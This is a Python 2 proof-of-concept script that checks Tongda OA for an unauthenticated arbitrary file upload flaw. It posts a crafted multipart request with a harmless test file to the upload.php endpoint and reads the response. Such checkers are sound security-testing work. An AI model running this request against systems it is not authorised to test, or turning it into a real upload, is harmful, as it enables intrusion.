#/usr/bin/env python
# -*- coding: utf-8 -*-
'''
# 通达OA任意文件上传漏洞
'''

import time,socket
import sys,re
import requests
socket.setdefaulttimeout(5)

payload = '/ispirit/im/upload.php'
boundary = 'aed51f13a0e0d6b2f6d8251c35651022'
data = []
data.append('--{}'.format(boundary))
data.append('Content-Disposition: form-data; name="UPLOAD_MODE"\r\n')
data.append('2')
data.append('--{}'.format(boundary))
data.append('Content-Disposition: form-data; name="P"\r\n')
data.append('123')
data.append('--{}'.format(boundary))
data.append('Content-Disposition: form-data; name="DEST_UID"\r\n')
data.append('1')
data.append('--{}'.format(boundary))
data.append('Content-Disposition: form-data; name="ATTACHMENT"; filename="Vulntest"\r\n')
data.append('test')
data.append('\r\n--{}--'.format(boundary))
sendbody = '\r\n'.join(data)


def Check_Vuln(ip,port):
    try:
        headers = {
        'Connection': 'close',
        'Content-Type'  :   'application/x-www-form-urlencoded',
        'Accept'    :   '*/*',
        'X-Requested-With'  :   'XMLHttpRequest',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0',
        }
        headers['Content-Type'] = 'multipart/form-data; boundary={}'.format(boundary)
        method = ['http://']
        for i in method:
            url = i + ip +':'+ port
            url_final = url + payload
            res = requests.post(url_final,data=sendbody,headers=headers,allow_redirects=False,verify=False,timeout=3)
            time.sleep(0.1)
            result = res.content
            if "|Vulntest" in result and "+OK " in result and res.status_code == 200:
                return True
            else:
                return False
    except Exception,msg:
        print msg
        return False


if __name__ == '__main__':
    Check_Vuln("10.0.13.241","80")